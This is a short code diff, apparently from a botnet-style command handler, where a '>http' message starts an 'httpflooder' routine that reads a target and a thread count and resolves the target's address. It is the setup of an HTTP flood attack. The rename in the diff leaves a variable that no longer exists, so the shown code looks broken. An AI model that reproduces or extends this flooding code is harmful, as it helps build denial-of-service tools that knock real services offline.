@@ -97,7 +97,7 @@ def system():
 				if ">http" in msg.lower():
 					def httpflooder():
 						try:
-							target = msg.split(" ")[1]
+							ip = msg.split(" ")[1]
 							numThreads = int(msg.split(" ")[2])
 
 							resolvedTarget = socket.gethostbyname(target)
